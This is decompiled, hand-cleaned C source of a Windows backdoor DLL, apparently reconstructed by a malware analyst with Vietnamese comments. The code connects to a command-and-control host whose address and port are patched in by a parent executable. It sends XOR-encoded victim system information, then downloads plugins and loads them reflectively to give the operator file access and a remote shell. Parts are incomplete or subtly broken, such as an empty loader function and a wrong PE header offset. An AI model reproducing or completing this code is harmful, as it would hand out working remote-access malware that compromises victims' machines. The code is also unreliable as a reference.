/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2019 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
   Raw edit by HTC
*/

#include <windows.h>

//-------------------------------------------------------------------------
// Enum/structs declarations, HTC

struct CONTROL_CMD
{
    int dwCode;
    int dwSizeOfData;
    void *pdata1;
    void *pdata2;
};

enum CMD_CODE
{
    CMD_COMPUTER_VICTIM_ID = 0x11000000,
    CMD_EXECUTE_FILE_NBF_PLUGIN = 0x21000000,
    CMD_EXECUTE_SHELL_NBS_PLUGIN = 0x23000000,
    CMD_DOWNLOAD_PLUGINS = 0x66000001,
    CMD_PLUGINS_REQUEST_DOWNLOAD = 0x66000003,
    CMD_PLUGIN_DATA_RETURN = 0x66000004,
    CMD_PLUGIN_BEGIN_DOWNLOAD = 0x66000005,
    CMD_PLUGIN_ALREADY_EXISTED = 0x66000006,
    CMD_PLUGIN_INVALID = 0x66000008,
    CMD_NBF_PLUGIN_DOWNLOAD_OK = 0x66000009,
    CMD_NBS_PLUGIN_DOWNLOAD_OK = 0x66000010,
};

struct __declspec(align(4)) PLUGIN_CMD
{
    DWORD dwCode;
    char szPluginName[64];
    int dwPluginSize;
};

//-------------------------------------------------------------------------
// Function declarations

BOOL set_keepalive_interval(SOCKET s, unsigned int seconds);
int socket_send(SOCKET s, char *buf, int len);
int socket_recv(SOCKET s, char *pData, int sizeData);
int socket_send_cmd(SOCKET s, char *pData, CONTROL_CMD *pCmd);
int socket_recv_cmd(SOCKET s, char *pData, CONTROL_CMD *pCmd);
char *XorString(char *pszDst, int len, unsigned __int8 key);
unsigned int gethostip(char *name);
void WINAPI windows_ThreadProc(LPVOID lpParam);
int send_cmd_code(int code);
DWORD WINAPI MainThreadProc(LPVOID lpParam);
DWORD WINAPI DownloadPlugin_ThreadProc(LPVOID lpParam);
int WINAPI windows();
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
HMODULE ReflectiveDllLoad(LPBYTE pMZ, int code);
LPVOID GetExportAddress(HMODULE pMZ, const char *pszFnName);
BOOL GetComputerInfo(LPSTR pCompInfo);
BOOL WINAPI capGetDriverDescs();

//-------------------------------------------------------------------------
// Data declarations

char g_xorKey = '>';    // sẽ bị ghi đè lại từ PE mẹ
u_short g_wPort = 22u;  // sẽ bị ghi đè lại từ PE mẹ
HINSTANCE g_hinstDLL = NULL;
HMODULE gh_nbfPlugin = NULL;
LPVOID nbfPlugin_file_proc = NULL;
HMODULE gh_nbsPlugin = NULL;
LPVOID nbsPlugin_shell_proc = NULL;
SOCKET g_socket;


BOOL set_keepalive_interval(SOCKET s, unsigned int seconds)
{
    tcp_keepalive keepAliveIn; // [esp+8h] [ebp-18h]
    tcp_keepalive keepAliveOut; // [esp+14h] [ebp-Ch]

    if (seconds < 1)
    {
        return 1;
    }

    seconds = 1;
    if (setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (const char *)&seconds, 4))
    {
        return 0;
    }

    keepAliveOut.keepalivetime = 0;
    keepAliveOut.onoff = 0;
    keepAliveOut.keepaliveinterval = 0;

    keepAliveIn.keepalivetime = 1000 * seconds;
    keepAliveIn.onoff = 1;
    keepAliveIn.keepaliveinterval = 1000;

    return WSAIoctl(s, SIO_KEEPALIVE_VALS, &keepAliveIn, 0xCu, &keepAliveOut, 0xCu, &s, 0, 0) == 0;
}

int socket_send(SOCKET s, char *buf, int len)
{
    int total; // ebx
    int remain; // edi
    int byteSend; // eax

    total = 0;
    remain = len;
    if (len <= 0)
    {
        return 1;
    }

    while (TRUE)
    {
        byteSend = send(s, buf, remain, 0);
        if (!byteSend || byteSend == 0xFFFFFFFF)
        {
            break;
        }

        total += byteSend;
        buf += byteSend;
        remain -= byteSend;
        if (total >= len)
        {
            return 1;
        }
    }

    return 0;
}

int socket_recv(SOCKET s, char *pData, int sizeData)
{
    int totalRecv; // ebx
    int sizeRemain; // edi
    int recvLen; // eax

    totalRecv = 0;
    sizeRemain = sizeData;
    if (sizeData <= 0)
    {
        return 1;
    }

    while (TRUE)
    {
        recvLen = recv(s, pData, sizeRemain, 0);
        if (!recvLen || recvLen == 0xFFFFFFFF)
        {
            break;
        }

        totalRecv += recvLen;
        pData += recvLen;
        sizeRemain -= recvLen;
        if (totalRecv >= sizeData)
        {
            return 1;
        }
    }

    return 0;
}

int socket_send_cmd(SOCKET s, char *pData, CONTROL_CMD *pCmd)
{
    int result; // eax

    result = socket_send(s, (char *)pCmd, 0x10);
    if (!result)
    {
        return result;
    }
    if (pCmd->dwSizeOfData)
    {
        result = socket_send(s, pData, pCmd->dwSizeOfData) != 0;
    }
    else
    {
        result = 1;
    }
    return result;
}

int socket_recv_cmd(SOCKET s, char *pData, CONTROL_CMD *pCmd)
{
    int result; // eax

    result = socket_recv(s, (char *)pCmd, 0x10);
    if (!result)
    {
        return result;
    }
    if (pCmd->dwSizeOfData)
    {
        result = socket_recv(s, pData, pCmd->dwSizeOfData) != 0;
    }
    else
    {
        result = 1;
    }
    return result;
}

char *XorString(char *pszDst, int len, unsigned __int8 key)
{
    char *pszInc; // eax

    pszInc = (char *)(key / 254);
    if (!len)
    {
        return pszInc;
    }

    pszInc = pszDst;
    do
    {
        *pszInc = key % 254 + 1 + ((key % 254 + 1) ^ *pszInc);
        ++pszInc;
        --len;
    }
    while (len);

    return pszInc;
}

unsigned int gethostip(char *name)
{
    hostent *result; // eax

    result = (hostent *)inet_addr(name);
    if ((int)result >= (int)INADDR_ANY)
    {
        return (unsigned int)result;
    }

    result = gethostbyname(name);
    if (result)
    {
        result = **(hostent ***)result->h_addr_list;
    }

    return (unsigned int)result;
}

void WINAPI __noreturn windows_ThreadProc(LPVOID lpParam)
{
    HANDLE hThread;
    struct WSAData WSAData;

    WSAStartup(0x202u, &WSAData);

    g_wPort = atoi("offsetport2");  // sẽ bị ghi đè lại từ PE mẹ để cập nhật port của CC
    OutputDebugStringA("offsetguid2");

    while (TRUE)
    {
        hThread = CreateThread(0, 0, MainThreadProc, 0, 0, 0);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        CloseHandle(hThread);
        Sleep(10000u);
    }
}

int send_cmd_code(int code)
{
    CONTROL_CMD cmd;

    cmd.data1 = 0;
    cmd.data2 = 0;
    cmd.dwSizeOfData = 0;
    cmd.dwCode = code;
    return socket_send_cmd(g_socket, 0, &cmd);
}

DWORD WINAPI MainThreadProc(LPVOID lpParam)
{
    SOCKET s; // ebx
    DWORD result; // eax
    CONTROL_CMD cmd; // [esp+8h] [ebp-10E8h]
    struct sockaddr_in addr; // [esp+18h] [ebp-10D8h]
    char szCompInfo[200]; // [esp+28h] [ebp-10C8h]
    char data[4096]; // [esp+F0h] [ebp-1000h]

    addr.sin_family = AF_INET;
    addr.sin_port = htons(g_wPort);
    addr.sin_addr.S_un.S_addr = gethostip("offsethost2");   // sẽ bị ghi đè lại từ PE mẹ để cập nhật ip của CC
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (connect(s, (const struct sockaddr *)&addr, 0x10) == SOCKET_ERROR)
    {
        return 0;
    }

    set_keepalive_interval(s, 75u);
    g_socket = s;

    GetComputerInfo(szCompInfo);
    *(_DWORD *)&szCompInfo[0xC4] = *(_DWORD *)&g_xorKey;
    *(_DWORD *)&szCompInfo[0xC0] = capGetDriverDescs();
    lstrcpyA(&szCompInfo[0xA0], "01");
    XorString(szCompInfo, 200, g_xorKey);
    qmemcpy(data, szCompInfo, 200u);

    cmd.dwCode = CMD_COMPUTER_VICTIM_ID;
    cmd.dwSizeOfData = 200;
    if (socket_send_cmd(s, szCompInfo, &cmd))
    {
        while (socket_recv_cmd(s, data, &cmd))
        {
            // "127.0.0.1" sẽ bị ghi đè lại từ PE mẹ để cập nhật address của CC
            switch (cmd.dwCode)
            {
                case CMD_EXECUTE_FILE_NBF_PLUGIN:
                    if (gh_nbfPlugin)
                    {
                        if (nbfPlugin_file_proc)
                        {
                            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)nbfPlugin_file_proc, "127.0.0.1", 0, 0);
                        }
                    }
                    break;

                case CMD_EXECUTE_SHELL_NBS_PLUGIN:
                    if (gh_nbsPlugin)
                    {
                        if (nbsPlugin_shell_proc)
                        {
                            CreateThread(0, 0, nbsPlugin_shell_proc, "127.0.0.1", 0, 0);
                        }
                    }
                    break;

                case CMD_DOWNLOAD_PLUGINS:
                    CreateThread(0, 0, DownloadPlugin_ThreadProc, 0, 0, 0);
                    break;
            }
        }

        shutdown(s, SD_BOTH);
        closesocket(s);
        result = 0xA;
    }
    else
    {
        closesocket(s);
        result = 1;
    }

    return result;
}

DWORD WINAPI DownloadPlugin_ThreadProc(LPVOID lpParam)
{
    SOCKET s; // ebp
    void *pMem; // esi
    BYTE *p_vPluginData; // esi MAPDST
    BYTE *pInc; // ebx MAPDST
    unsigned int recvSize; // eax MAPDST
    HMODULE h_nbfPlugin; // eax
    HMODULE h_nbsPlugin; // eax
    int timeout; // [esp+18h] [ebp-10B4h]
    struct sockaddr_in saddr; // [esp+1Ch] [ebp-10B0h]
    PLUGIN_CMD nbfPluginCmd; // [esp+2Ch] [ebp-10A0h]
    CONTROL_CMD cmd; // [esp+74h] [ebp-1058h]
    PLUGIN_CMD nbsPluginCmd; // [esp+84h] [ebp-1048h]
    char buffer[4096]; // [esp+CCh] [ebp-1000h]

    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(g_wPort);
    saddr.sin_addr.S_un.S_addr = gethostip("offsethost2");  // sẽ bị ghi đè lại từ PE mẹ để cập nhật ip của CC
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(s, (const struct sockaddr *)&saddr, 0x10) == SOCKET_ERROR)
    {
        closesocket(s);
        return 0;
    }

    timeout = 0xEA60;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, 4);

    pMem = new BYTE[0x180000u];

    cmd.dwCode = CMD_PLUGINS_REQUEST_DOWNLOAD;
    cmd.dwSizeOfData = 0;
    if (!socket_send_cmd(s, (char *)pMem, &cmd))
    {
        if (pMem)
        {
            delete[] pMem;
        }

        closesocket(s);
        return 0;
    }

    nbsPluginCmd.dwCode = 0;
    memset(nbsPluginCmd.szPluginName, 0, 0x44u);
    while (TRUE)
    {
        if (!socket_recv(s, (char *)&nbsPluginCmd, 0x48))
        {
            return 0;
        }

        if (nbsPluginCmd.dwCode == CMD_PLUGIN_DATA_RETURN)
        {
            break;
        }

        Sleep(0x14u);
    }

    if (0 == strcmp(nbsPluginCmd.szPluginName, "nbf.plugin"))
    {
        if (gh_nbfPlugin && nbfPlugin_file_proc)
        {
@@Plugin_Already_Existed:
            memset(nbfPluginCmd.szPluginName, 0, 0x44u);
            nbfPluginCmd.dwCode = CMD_PLUGIN_ALREADY_EXISTED;
            goto @@SendFinish;
        }

        p_vPluginData = (BYTE *)VirtualAlloc(0, nbsPluginCmd.dwPluginSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        if (!p_vPluginData)
        {
            goto @@VirAlloc_Failed;
        }

        memset(nbfPluginCmd.szPluginName, 0, 0x44u);
        nbfPluginCmd.dwCode = CMD_PLUGIN_BEGIN_DOWNLOAD;
        if (!socket_send(s, (char *)&nbfPluginCmd, 0x48))
        {
            goto @@VirFree;
        }

        pInc = p_vPluginData;
        while (TRUE)
        {
            memset(buffer, 0, sizeof(buffer));
            recvSize = recv(s, buffer, 0x1000, 0);
            if (!recvSize)
            {
                break;
            }

            // Below block is memcpy, need rewrite
            qmemcpy(pInc, buffer, 4 * (recvSize >> 2));
            pInc = &pInc[4 * (recvSize >> 2)];
            qmemcpy(pInc, &buffer[4 * (recvSize >> 2)], recvSize & 3);
            pInc += recvSize;
        }

        h_nbfPlugin = ReflectiveDllLoad(p_vPluginData, 1);
        gh_nbfPlugin = h_nbfPlugin;
        if (h_nbfPlugin)
        {
            nbfPlugin_file_proc = GetExportAddress(h_nbfPlugin, "file");
            if (nbfPlugin_file_proc)
            {
                send_cmd_code(CMD_NBF_PLUGIN_DOWNLOAD_OK);
                goto @@ShutdownSocketAndReturn;
            }

            gh_nbfPlugin = 0;
            nbfPlugin_file_proc = 0;
        }

@@VirFreeToReturn:
        VirtualFree(p_vPluginData, 0, MEM_RELEASE);

@@ShutdownSocketAndReturn:
        shutdown(s, SD_BOTH);
        closesocket(s);
        return 0;
    }
    else if (0 == strcmp(nbsPluginCmd.szPluginName, "nbs.plugin"))
    {
        if (gh_nbsPlugin && nbsPlugin_shell_proc)
        {
            goto @@Plugin_Already_Existed;
        }

        p_vPluginData = (BYTE *)VirtualAlloc(0, nbsPluginCmd.dwPluginSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        if (!p_vPluginData)
        {
@@VirAlloc_Failed:
            VirtualFree(0, 0, MEM_RELEASE);
            return 0;
        }

        memset(nbfPluginCmd.szPluginName, 0, 0x44u);
        nbfPluginCmd.dwCode = CMD_PLUGIN_BEGIN_DOWNLOAD;
        if (!socket_send(s, (char *)&nbfPluginCmd, 0x48))
        {
@@VirFree:
            VirtualFree(p_vPluginData, 0, MEM_RELEASE);
            return 0;
        }

        pInc = p_vPluginData;
        while (TRUE)
        {
            memset(buffer, 0, sizeof(buffer));
            recvSize = recv(s, buffer, 0x1000, 0);
            if (!recvSize)
            {
                break;
            }

            // Below block is memcpy, need rewrite
            qmemcpy(p_vPluginData, buffer, 4 * (recvSize >> 2));
            pInc = &p_vPluginData[4 * (recvSize >> 2)];
            qmemcpy(pInc, &buffer[4 * (recvSize >> 2)], recvSize & 3);
            pInc += recvSize;
        }

        h_nbsPlugin = ReflectiveDllLoad(p_vPluginData, 1);
        gh_nbsPlugin = h_nbsPlugin;
        if (h_nbsPlugin)
        {
            nbsPlugin_shell_proc = (LPTHREAD_START_ROUTINE)GetExportAddress(h_nbsPlugin, "shell");
            if (nbsPlugin_shell_proc)
            {
                send_cmd_code(CMD_NBS_PLUGIN_DOWNLOAD_OK);
                goto @@ShutdownSocketAndReturn;
            }

            gh_nbsPlugin = 0;
            nbsPlugin_shell_proc = 0;
        }

        goto @@VirFreeToReturn;
    }
    else
    {
        memset(nbfPluginCmd.szPluginName, 0, 0x44u);
        nbfPluginCmd.dwCode = CMD_PLUGIN_INVALID;
@@SendFinish:
        socket_send(s, (char *)&nbfPluginCmd, 0x48);
        return 0;
    }
}

int WINAPI windows()
{
    HANDLE hThread;

    hThread = CreateThread(0, 0, windows_ThreadProc, 0, 0, 0);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason != 1)
    {
        return 1;
    }
    g_hinstDLL = hinstDLL;
    OutputDebugStringA("...");
    return 1;
}

HMODULE ReflectiveDllLoad(LPBYTE pMZ, int code)
{
    // Như trên mạng đầy :D
    // Trả về HINSTANCE của plugin downloaded
}

// Chưa viết lại
LPVOID GetExportAddress(HMODULE pMZ, const char *pszFnName)
{
    IMAGE_NT_HEADERS *pNtHdr; // eax
    IMAGE_EXPORT_DIRECTORY *pExportDirectory; // ebp
    int dwNumberOfNames; // edx
    char *pVA_AddrOfFuncs; // ecx
    char *pVA_AddrOfNames; // eax
    signed int idxOfFunc; // eax
    _DWORD *i; // edx
    unsigned int rvaFunc; // eax
    char *pVA_AddrOfNameOrdinals; // [esp+10h] [ebp-Ch]
    char *pVA_AddressOfFunctions; // [esp+14h] [ebp-8h]
    IMAGE_EXPORT_DIRECTORY *dwExportTableSize; // [esp+18h] [ebp-4h] MAPDST
    int pMZa; // [esp+20h] [ebp+4h]

    if (!pMZ)
    {
        return 0;
    }
    if (*(_WORD *)pMZ != IMAGE_DOS_SIGNATURE)
    {
        return 0;
    }

    pNtHdr = (IMAGE_NT_HEADERS *)((char *)pMZ + 0x3E));
    if (pNtHdr->Signature != IMAGE_NT_SIGNATURE)
    {
        return 0;
    }

    pExportDirectory = (IMAGE_EXPORT_DIRECTORY *)pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!pExportDirectory)
    {
        return 0;
    }
    dwExportTableSize = (IMAGE_EXPORT_DIRECTORY *)pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!dwExportTableSize)
    {
        return 0;
    }

    dwNumberOfNames = *(DWORD *)((char *)&pExportDirectory->NumberOfNames + (_DWORD)pMZ);
    pVA_AddrOfFuncs = (char *)pMZ + *(DWORD *)((char *)&pExportDirectory->AddressOfFunctions + (_DWORD)pMZ);
    pVA_AddrOfNameOrdinals = (char *)pMZ + *(DWORD *)((char *)&pExportDirectory->AddressOfNameOrdinals + (_DWORD)pMZ);
    pVA_AddrOfNames = (char *)pMZ + *(DWORD *)((char *)&pExportDirectory->AddressOfNames + (_DWORD)pMZ);
    pVA_AddressOfFunctions = (char *)pMZ + *(DWORD *)((char *)&pExportDirectory->AddressOfFunctions + (_DWORD)pMZ);
    if ((unsigned int)pszFnName & 0xFFFF0000)
    {
        pMZa = 0;
        if (dwNumberOfNames <= 0)
        {
            return 0;
        }

        for (i = pVA_AddrOfNames; strcmp((const char *)pMZ + *i, pszFnName); ++i)
        {
            if (++pMZa >= *(signed int *)((char *)&pExportDirectory->NumberOfNames + (_DWORD)pMZ))
            {
                return 0;
            }
        }

        if (pMZa < 0)
        {
            return 0;
        }

        idxOfFunc = *(unsigned __int16 *)&pVA_AddrOfNameOrdinals[2 * pMZa];
        pVA_AddrOfFuncs = pVA_AddressOfFunctions;
    }
    else
    {
        idxOfFunc = (unsigned int)pszFnName & (0xFFFF - *(DWORD *)((char *)&pExportDirectory->OridinalBase + (_DWORD)pMZ));
    }

    if (idxOfFunc < 0)
    {
        return 0;
    }

    if (idxOfFunc >= *(signed int *)((char *)&pExportDirectory->NumberOfFunctions + (_DWORD)pMZ))
    {
        return 0;
    }

    rvaFunc = *(_DWORD *)&pVA_AddrOfFuncs[4 * idxOfFunc];
    if (rvaFunc > (unsigned int)pExportDirectory
      && (IMAGE_EXPORT_DIRECTORY *)rvaFunc < (IMAGE_EXPORT_DIRECTORY *)((char *)dwExportTableSize + (int)pExportDirectory))
    {
        return 0;
    }

    return (char *)pMZ + rvaFunc;
}

BOOL GetComputerInfo(LPSTR pCompInfo)
{
    DWORD nSize; // [esp+8h] [ebp-C0h]
    struct _MEMORYSTATUS memStatus; // [esp+Ch] [ebp-BCh]
    struct _OSVERSIONINFOA verInfo; // [esp+2Ch] [ebp-9Ch]

    memset(pCompInfo, 0, 0xC8u);
    nSize = 0x40;
    GetComputerNameA(pCompInfo, &nSize);
    memset(&verInfo, 0, 0x9Cu);
    verInfo.dwOSVersionInfoSize = 0x9C;
    GetVersionExA(&verInfo);
    wsprintfA(pCompInfo + 0x60, "Win %d.%d (%d)", verInfo.dwMajorVersion, verInfo.dwMinorVersion, verInfo.dwBuildNumber);
    memStatus.dwLength = 0x20;
    GlobalMemoryStatus(&memStatus);
    wsprintfA(pCompInfo + 0x40, "%dMB", (memStatus.dwTotalPhys >> 0x14) + 1);
    return 1;
}

// Hàm này dư, không làm gì cả, cũng như các hàm của zlib, đã xóa bỏ
BOOL WINAPI capGetDriverDescs()
{
    BOOL result; // eax
    signed int i; // esi
    CHAR szVer[52]; // [esp+0h] [ebp-98h]
    CHAR szName[100]; // [esp+34h] [ebp-64h]

    if (byte_10008408)                        // = 0
    {
        return 0;
    }
    result = 0;
    for (i = 0; i < 0xA; ++i)
    {
        if (result)
        {
            break;
        }
        result = capGetDriverDescriptionA(i, szName, 0x64, szVer, 0x32);
    }
    return result;
}
